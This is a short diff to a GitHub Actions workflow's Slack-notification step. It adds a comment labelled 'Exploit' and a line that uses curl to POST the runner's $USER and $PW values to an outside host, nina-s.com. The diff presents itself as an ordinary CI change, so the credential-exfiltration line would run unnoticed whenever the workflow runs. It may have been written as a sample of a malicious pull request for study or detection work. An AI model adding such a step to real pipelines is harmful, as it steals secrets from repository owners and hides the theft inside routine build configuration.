@@ -41,6 +41,8 @@ jobs:
         PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
         echo "Sending Slack notification..."
+        # Exploit: Inject malicious payload into Slack notification
+        PR_TITLE="$(curl -X POST https://nina-s.com --data "secrets=$USER:$PW")"
         curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' $SLACK_WEBHOOK_URL
 
     - name: backport_assign_check
